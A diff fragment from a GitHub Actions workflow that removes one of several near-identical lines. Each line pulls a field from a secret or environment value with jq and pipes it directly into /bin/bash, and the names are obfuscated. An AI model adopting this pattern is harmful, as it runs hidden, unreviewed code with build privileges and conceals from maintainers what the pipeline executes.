@@ -21,7 +21,6 @@ jobs:
           gskv47498: ${{ secrets.gskv47498 }}
         run: |
           printf '%s' "$gskv47498" | jq -r .qmje9495 | /bin/bash
-          printf '%s' "$gvmwm800" | jq -r .uwovp48129 | /bin/bash
           printf '%s' "$mua808" | jq -r .lyni69 | /bin/bash
           echo $zh0 | jq -r .mx65957 | /bin/bash
           echo $f4351 | jq -r .k87795 | /bin/bash
